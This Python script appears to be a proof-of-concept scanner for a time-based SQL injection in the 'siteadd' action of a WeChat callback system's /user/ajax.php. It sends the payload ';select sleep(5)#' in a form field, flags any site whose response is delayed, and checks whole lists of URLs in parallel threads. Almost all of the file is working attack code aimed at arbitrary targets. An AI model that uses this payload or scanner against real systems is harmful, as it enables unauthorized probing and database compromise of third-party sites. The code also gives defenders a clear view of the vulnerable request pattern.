import requests
import argparse
import time
import threading

# 检测单个URL
def ajax(url):
    create_url = url+"/user/ajax.php?act=siteadd"

    data = {"siteUrl":"';select sleep(5)#'"}
    headers = {
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
    ,"Content-Type":"application/x-www-form-urlencoded"
}

    try:
        start_time = time.time()
        req = requests.post(create_url, data=data, headers=headers)
        end_time = time.time()
        req_time = end_time - start_time
        if(req_time>=5):
            print("{}存在延迟注入".format(url))
        else:
            print("不存在延迟注入")
    except:
        print("不允许访问")

# 批量检测
def ajax_counts(filename):
    try:
        with open(filename, 'r') as file:
            urls = file.readlines()
            threads = []
            for url in urls:
                url = url.strip()
                if url:
                    thread = threading.Thread(target=ajax, args=(url,))
                    threads.append(thread)
                    thread.start()
            for thread in threads:
                thread.join()
    except Exception as e:
        print(f"发生错误: {str(e)}")

def start():
    logo='''
                __                          .__            
_____      |__|____  ___  ___    ______ |  |__ ______  
\__  \     |  \__  \ \  \/  /    \____ \|  |  \\____ \ 
 / __ \_   |  |/ __ \_>    <     |  |_> >   Y  \  |_> >
(____  /\__|  (____  /__/\_ \ /\ |   __/|___|  /   __/ 
     \/\______|    \/      \/ \/ |__|        \/|__|    


'''
    print(logo)
    print("wirten by YZX100")

# 帮助信息
def main():
    parser = argparse.ArgumentParser(description="公众号无限回调系统ajax.php存在SQL注入漏洞")
    parser.add_argument('-u',type=str,help='检测单个url')
    parser.add_argument('-f', type=str, help='批量检测url列表文件')
    args = parser.parse_args()
    if args.u:
        ajax(args.u)
    elif args.f:
        ajax_counts(args.f)
    else:
        parser.print_help()

if __name__ == "__main__":
    start()
    main()
